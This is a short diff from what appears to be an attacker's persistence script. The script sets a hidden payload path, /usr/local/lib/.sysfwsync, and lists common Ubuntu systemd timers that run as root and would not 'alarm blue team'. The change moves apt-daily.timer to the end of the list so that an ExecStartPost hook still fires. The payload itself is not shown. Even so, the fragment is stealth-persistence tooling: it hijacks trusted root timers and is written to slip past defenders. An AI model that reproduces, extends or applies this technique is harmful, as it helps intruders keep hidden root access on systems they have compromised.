@@ -36,7 +36,6 @@ PAYLOAD="/usr/local/lib/.sysfwsync"
 # Priority list: timers that exist on nearly every Ubuntu 24.04 install,
 # run as root, and whose absence from the log wouldn't alarm blue team.
 CANDIDATES=(
-    "apt-daily.timer"
     "man-db.timer"
     "logrotate.timer"
     "fstrim.timer"
@@ -45,6 +44,8 @@ CANDIDATES=(
     "dpkg-db-backup.timer"
     "motd-news.timer"
     "ua-timer.timer"
+    "apt-daily.timer"          # last — apt-daily ExecStart may fail if no-apt.sh ran first,
+                               # which prevents ExecStartPost from firing
 )
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
